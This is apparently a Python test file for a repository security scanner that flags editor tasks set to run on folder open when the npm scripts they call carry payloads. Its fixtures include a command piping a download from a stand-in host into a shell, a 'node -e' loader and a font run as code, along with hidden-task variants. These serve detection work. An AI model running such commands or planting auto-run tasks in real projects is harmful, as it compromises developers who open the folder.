#!/usr/bin/env python3
"""A package script an editor task runs when its folder opens is read and checked as the task's own command
is: a payload in it reads infected whether the task hides itself or not."""
from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security.matchers.task_package_script import TaskPackageScriptMatcher
from stayawake.bots.security.models import INFECTED
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import LocalRepoTarget, ScanOptions
from tests.support.samples import FONT_PAYLOAD, joined, loader_line

_SCRIPT = "vscode-task-runs-payload-script"
_PAYLOADS = {
    "runs a font": lambda: f"node {FONT_PAYLOAD}",
    "pipes a download into a shell": lambda: joined("curl -s https://example.invalid/i | ", "sh"),
    "carries a known loader": lambda: joined("node -e \"", loader_line().replace('"', "'"), "\""),
}


def _open(**fields) -> dict:
    return {"label": "dev", "type": "shell", "runOptions": {"runOn": "folderOpen"}, **fields}


def _scan(tasks: list[dict], scripts: dict[str, str], package_dir: str = "", extra: dict | None = None):
    root = Path(tempfile.mkdtemp(prefix="pkg-"))
    (root / ".vscode").mkdir()
    (root / ".vscode" / "tasks.json").write_text(json.dumps({"version": "2.0.0", "tasks": tasks}))
    package = root / package_dir / "package.json"
    package.parent.mkdir(parents=True, exist_ok=True)
    package.write_text(json.dumps({"name": "app", "scripts": scripts}))
    for rel, text in (extra or {}).items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(text)
    return scan_target(LocalRepoTarget(root, str(root), ScanOptions()), load_signatures(), [])


def _ids(result) -> set[str]:
    return {f.signature_id for f in result.findings}


class TestAPayloadInAScriptAFolderOpenTaskRunsIsFound(unittest.TestCase):
    def test_a_payload_in_the_script_reads_infected_hidden_or_visible(self):
        runs = ({"command": "npm run watch"}, {"command": "pnpm run watch"}, {"command": "yarn watch"},
                {"command": "bun run watch"}, {"type": "npm", "script": "watch"},
                {"command": "cd web && npm run watch"}, {"command": "npm run watch&&echo done"},
                {"command": "(npm run watch)"})
        for kind, payload in _PAYLOADS.items():
            for run in runs:
                for presentation in ({}, {"presentation": {"reveal": "never"}}):
                    with self.subTest(kind=kind, run=run, hidden=bool(presentation)):
                        result = _scan([_open(**run, **presentation)], {"watch": payload()})
                        self.assertIn(_SCRIPT, _ids(result))
                        self.assertEqual(result.verdict, INFECTED)

    def test_the_scripts_npm_runs_by_their_own_names_are_read(self):
        for command, script in (("npm start", "start"), ("npm test", "test"), ("npm restart", "start"),
                                ("npm run watch", "prewatch"), ("npm run watch", "postwatch")):
            with self.subTest(command=command, script=script):
                scripts = {"watch": "tsc -w", script: _PAYLOADS["runs a font"]()}
                self.assertIn(_SCRIPT, _ids(_scan([_open(command=command)], scripts)))

    def test_a_script_another_script_runs_is_read(self):
        scripts = {"watch": "npm run build && tsc -w", "build": _PAYLOADS["pipes a download into a shell"]()}
        self.assertIn(_SCRIPT, _ids(_scan([_open(command="npm run watch")], scripts)))

    def test_a_script_a_dependency_runs_is_read(self):
        scripts = {"watch": _PAYLOADS["runs a font"]()}
        compound = {"label": "all", "dependsOn": ["npm: watch"], "runOptions": {"runOn": "folderOpen"}}
        self.assertIn(_SCRIPT, _ids(_scan([compound], scripts)))
        named = [{"label": "all", "dependsOn": ["watch task"], "runOptions": {"runOn": "folderOpen"}},
                 {"label": "watch task", "type": "shell", "command": "npm run watch"}]
        self.assertIn(_SCRIPT, _ids(_scan(named, scripts)))

    def test_a_package_in_a_subfolder_is_read(self):
        scripts = {"watch": _PAYLOADS["runs a font"]()}
        task = _open(command="npm run watch", options={"cwd": "${workspaceFolder}/web"})
        self.assertIn(_SCRIPT, _ids(_scan([task], scripts, package_dir="web")))

    def test_a_task_file_of_a_project_in_a_subfolder_is_read(self):
        tasks = json.dumps({"version": "2.0.0", "tasks": [_open(command="npm run watch")]})
        result = _scan([], {"watch": _PAYLOADS["runs a font"]()}, package_dir="apps/web",
                       extra={"apps/web/.vscode/tasks.json": tasks})
        self.assertIn(_SCRIPT, _ids(result))


class TestOrdinaryScriptsAreNotPayloads(unittest.TestCase):
    def test_an_ordinary_script_is_not_reported(self):
        for script in ("tsc -w", "vite --port 3000", f"pyftsubset {FONT_PAYLOAD} --flavor=woff2",
                       "next dev && echo ready", joined("svgtofont -o public/icons.", "woff2")):
            with self.subTest(script=script):
                self.assertNotIn(_SCRIPT, _ids(_scan([_open(command="npm run watch")], {"watch": script})))

    def test_a_script_no_folder_open_task_runs_is_not_reported(self):
        task = {"label": "dev", "type": "shell", "command": "npm run watch"}
        self.assertNotIn(_SCRIPT, _ids(_scan([task], {"watch": _PAYLOADS["runs a font"]()})))

    def test_the_projects_own_script_is_the_one_read(self):
        files = {".vscode/tasks.json": json.dumps({"tasks": [_open(command="npm run lint")]}),
                 "package.json": json.dumps({"scripts": {"build": "tsc"}}),
                 "node_modules/lib/package.json": json.dumps(
                     {"scripts": {"lint": _PAYLOADS["runs a font"]()}})}
        sigs = [s for group in load_signatures().values() for s in group]
        target = mock.Mock(iter_files=lambda: list(files), read_text=lambda rel: files.get(rel))
        mine = [s for s in sigs if s["id"] == _SCRIPT]
        self.assertEqual(TaskPackageScriptMatcher().scan(target, mine, sigs), [])


if __name__ == "__main__":
    unittest.main()
